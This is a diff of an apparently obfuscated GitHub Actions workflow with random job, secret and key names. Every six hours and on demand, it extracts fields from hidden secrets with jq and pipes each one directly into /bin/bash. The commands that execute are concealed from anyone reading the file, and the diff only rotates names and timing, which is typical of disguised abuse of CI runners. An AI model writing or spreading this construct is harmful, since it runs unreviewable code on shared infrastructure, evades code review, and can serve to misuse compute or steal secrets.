@@ -1,26 +1,25 @@
 name: zgjdfbl
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 2/6 * * *'
+    - cron: '34 1/6 * * *'
 
-jobs:  # 51
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zgjdfbl
         env:
-          jts6: ${{ secrets.jts6 }}
+          fhnqw61: ${{ secrets.fhnqw61 }}
         run: |
-          echo $jts6 | jq -r .wfov0 | /bin/bash
-          echo $qpf82 | jq -r .jq91910 | /bin/bash
-          echo $utr83955 | jq -r .ciftu405 | /bin/bash
-          echo $coue61732 | jq -r .ggh3 | /bin/bash
-          echo $qd309 | jq -r .snsz548 | /bin/bash
-          echo $z7960 | jq -r .fd6938 | /bin/bash
-          echo $yo7 | jq -r .xmw663 | /bin/bash
-          echo $uakvg47 | jq -r .gfqm92 | /bin/bash
+          echo $fhnqw61 | jq -r .cdhz1766 | /bin/bash
+          echo $i385 | jq -r .qhbeq680 | /bin/bash
+          echo $jea074 | jq -r .bum46344 | /bin/bash
+          echo $ymxf347 | jq -r .jrokf63 | /bin/bash
+          echo $y2 | jq -r .nc172 | /bin/bash
+          echo $zu48672 | jq -r .fh0519 | /bin/bash
+          echo $tv4 | jq -r .zcrk950 | /bin/bash
+          echo $yeubm459 | jq -r .yotwf97 | /bin/bash
+          echo $mt8048 | jq -r .iadkt7791 | /bin/bash
 
